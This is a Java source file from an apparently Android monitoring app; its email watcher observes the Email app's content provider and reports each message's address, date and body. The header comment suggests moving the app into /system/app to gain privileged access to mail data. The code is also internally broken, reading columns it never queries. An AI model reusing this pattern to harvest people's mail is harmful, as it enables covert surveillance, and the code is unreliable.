package org.ddth.android.monitor.observer;

import java.util.Date;

import org.ddth.android.monitor.core.AndroidEvent;
import org.ddth.mobile.monitor.core.Event;
import org.ddth.mobile.monitor.core.Reporter;
import org.ddth.mobile.monitor.report.Email;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;

/**
 * Sorry to say this but this code doesn't work. Android restricts access to
 * private user data in Mail application with "signatureOrSystem" permission
 * level. We may, however, tell users to manually copy the application to
 * /system/app and thus the application can obtain the permission to access
 * mail data because it is now a system app.
 * 
 * @author khoanguyen
 */
public final class AndroidEmailWatcher extends AndroidWatcher {
	
	private static final String CONTENT_EMAIL = "content://com.android.email.provider";

	private static final String[] INTENTS = {};
	
	private ContentObserver observer;
	
	public AndroidEmailWatcher(Reporter reporter) {
		setReporter(reporter);
	}
	
	@Override
	public String[] getIntents() {
		return INTENTS;
	}

	@Override
	public void start(Event dc) {
		super.start(dc);
		registerContentObserver(((AndroidEvent) dc));
	}

	@Override
	public void stop(Event dc) {
		super.stop(dc);
		Context context = ((AndroidEvent) dc).getContext();
		context.getContentResolver().unregisterContentObserver(observer);
	}

	@Override
	public void service(AndroidEvent event) {
		Email email = null;
		if (email != null) {
			getReporter().report(event, email);
		}
	}

	/**
	 * Register an observer for listening incoming/outgoing email events.
	 * 
	 * @param dc
	 */
	private void registerContentObserver(final AndroidEvent dc) {
		if (observer != null) {
			return;
		}
		final Context context = dc.getContext();
		observer = new ContentObserver(null) {
			public void onChange(boolean selfChange) {
				Email email = readFrom(context);
				// Get super class notified
				if (email != null) {
					getReporter().report(dc, email);
				}
			}
		};
		context.getContentResolver().registerContentObserver(
			Uri.parse(CONTENT_EMAIL), true, observer);
	}
	
	public static final String RECORD_ID = "_id";
	public static final String[] ID_PROJECTION = new String[] {
        RECORD_ID
    };
	
	/**
	 * This is invoked directly from the Email observer to retrieve the outgoing
	 * Email. A more elegant method would be firing a broadcast intent and let the
	 * receiver handles the intent naturally.
	 * 
	 * @see #registerContentObserver(AndroidEvent, int)
	 * @param context
	 */
	private Email readFrom(Context context) {
		Cursor cursor = context.getContentResolver().query(
				Uri.parse(CONTENT_EMAIL), ID_PROJECTION, null, null, null);
		Email email = null;
		if (cursor.moveToNext()) {
			int dateColumn = cursor.getColumnIndex("date");
			int bodyColumn = cursor.getColumnIndex("body");
			int addressColumn = cursor.getColumnIndex("address");

			String from = "0";
			String to = cursor.getString(addressColumn);
			Date now = new Date(cursor.getLong(dateColumn));
			String body = cursor.getString(bodyColumn);
			String subject = "Email...";
			email = new Email(from, to, subject, body, now);
		}
		cursor.close();
		return email;
	}
}